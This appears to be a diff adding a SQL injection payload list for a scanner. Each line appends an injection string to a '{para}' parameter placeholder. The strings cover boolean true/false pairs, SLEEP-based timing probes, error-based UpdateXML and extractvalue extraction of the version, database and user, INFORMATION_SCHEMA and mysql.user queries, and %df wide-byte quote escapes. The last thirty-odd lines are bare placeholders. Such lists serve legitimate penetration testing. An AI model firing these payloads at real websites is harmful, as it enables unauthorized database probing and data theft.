@@ -1,0 +1,95 @@
+rand(true)
+rand(FALSE)
+1-IF((1=1),1,(SELECT 1 UNION SELECT 2))
+1-IF((1=2),1,(SELECT 1 UNION SELECT 2))
+DESE,IF((1=1 AND 7053=7053),1,(SELECT 1 UNION SELECT 2)) DESE
+DESE,IF((1=1 AND 7053=7054),1,(SELECT 1 UNION SELECT 2)) DESE
+{para}'%23
+{para}%23
+{para} AND 81=81
+{para} AND 81=82
+{para} AND 1-FALSE
+{para} AND 1-TRUE
+{para} AND 2-1
+{para} AND 2-2
+{para} AND 2*3=6
+{para} AND 2*3=9
+{para} OR 81=81
+{para} OR 81=82
+{para} AND 1=1X
+{para} OR 1=1X
+{para} ORDER BY 1-- -
+{para} ORDER BY 100-- -
+{para} and 1=if((1=1 AND 6607=6607),1,(select 1 union select 2))
+{para} and 1=if((1=1 AND 6607=6608),1,(select 1 union select 2))
+{para},if((1=1),1,(select 1 from INFORMATION_SCHEMA.SCHEMATA))
+{para},if((1=2),1,(select 1 from INFORMATION_SCHEMA.SCHEMATA))
+{para}'%2b(if((1=1),1,(select 1 from information_schema.tables)))%2b'
+{para}'%2b(if((1=2),1,(select 1 from information_schema.tables)))%2b'
+{para},1=if((1=1 AND 5235=5235 ),1,(select 1 union select 2))
+{para},1=if((1=2 AND 5235=5235 ),1,(select 1 union select 2))
+{para} AND SLEEP(5)
+{para} LIMIT 1%23
+{para} OR TRUR LIMIT 1%23
+{para}' AND SLEEP(5)%23
+{para}' AND SLEEP(5) AND 'PYVJ'='PYVJ
+{para}'
+{para}%df'
+{para}''
+{para}"
+{para}%df"
+{para}""
+{para}' OR '1
+{para}' OR 1-- -
+{para}" OR ""="
+{para}" OR 1=1-- -
+{para}'='
+{para}'LIKE'
+{para}'=0--+
+{para}'or updatexml(1,concat(0x7e,(version())),0) or'
+{para}'or extractvalue(1,concat(0x7e,database())) or'
+{para} and UpdateXML(1,CONCAT(0x5b,mid((SELECT user()),1,32),0x5d),1)
+{para}'+ (UpdateXML(1,CONCAT(0x5b,mid( (select database()) ,1,32),0x5d),1)) +'
+{para}'||(true and 1=1) limit 2%23
+{para}' AND 3928=3928 AND 'gswx'='gswx
+{para}' AND 3928=3929 AND 'gswx'='gswx
+{para}" and 12=12 and "kn"="kn
+{para}' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0X7C,(SELECT (SELECT VERSION()) FROM INFORMATION_SCHEMA.TABLES LIMIT 0,1),0X7C,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x LIMIT 0,1)a)%23
+{para} order by 1,If((1=1),1,(select user from mysql.user))-- -
+{para} order by 1,If((1=2),1,(select user from mysql.user))-- -
+{para}%' and 1=1 and '%'='
+{para}%' and 1=2 and '%'='
+{para}
+{para}
+{para})
+{para}
+{para}
+{para}
+{para}
+{para}
+{para}
+{para}
+{para}
+{para}
+{para}
+{para}
+{para}
+{para}
+{para}
+{para}
+{para}
+{para}
+{para}
+{para}
+{para}
+{para}
+{para}
+{para}
+{para}
+{para}
+{para}
+{para}
+{para}
+{para}
+{para}
+{para}
